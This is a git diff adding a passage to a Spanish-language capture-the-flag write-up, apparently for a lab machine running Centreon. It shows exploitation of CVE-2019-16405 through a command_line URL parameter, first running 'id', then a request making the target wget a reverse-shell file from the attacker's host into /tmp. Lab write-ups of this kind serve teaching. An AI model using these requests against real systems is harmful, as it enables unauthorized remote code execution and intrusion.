@@ -54,3 +54,27 @@ Tal como se puede mostrar en la imagen, nos ha dejado loguearnos.
 ![image](https://user-images.githubusercontent.com/87484792/184038497-785183bd-a2e8-4d03-b853-7d061616b1fb.png)
 
 Mirando los POC de los CVE, intenté hacerlo de forma manual. De forma grafica tendremos que acceder a **"Config > Commands > Discovery"**
+Sin embargo parece que no funciona, algo esta bloqueando el poder ejecutar comandos. Dudo que siendo admin no tengamos los privilegios suficientes para ejecutar comandos.
+
+![image](https://user-images.githubusercontent.com/87484792/184151052-528764c9-7215-4afa-82df-e14288fbda6f.png)
+
+Me pregunté si habia algún WAF activo. Probé tambien con Scripts que habia de la comunidad en GitHub y Scripts de db-exploit. Ninguno me daba una shell.
+Como habia más de un CVE que afectaba a esta versión, decidi mirar los otros caminos posibles. 
+
+## CVE-2019-16405
+
+Podemos realizar Ejecución Remota de Comandos a traves de una modificación de plugin, siempre y cuando tengamos permisos de administrador.
+Es el caso, así que probaré.
+
+![image](https://user-images.githubusercontent.com/87484792/184155790-5802941d-d764-4ce8-9d33-05e921090fc9.png)
+
+`URL: http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=id&o=p&min=1`
+
+Y si, efectivamente podemos ejecutar comandos. Trataré de cargar una shell para ejecutarla con bash. Hay varios Scripts que son totalmente funcionales, y que dejaré en este write up, pero esta vez lo haremos de forma manual. 
+
+De primeras, crearé un archivo llamado 'shell' con una reverse dentro, compartiré ese archivo a traves de un servidor Python y por último ejecutaré en el centreon el comando de *wget* para descargarlo en la maquina victima.  
+
+![image](https://user-images.githubusercontent.com/87484792/184157502-36293fb2-ee1a-4d9f-9c34-5a1b7279e2c5.png)
+
+`http://10.10.10.157/centreon/main.get.php?p=60801&command_hostaddress=&command_example=&command_line=wget%20http%3A%2F%2F10.10.16.7%2Fshell%20%3E%20%2Ftmp%2Fshell&o=p&min=1`
+
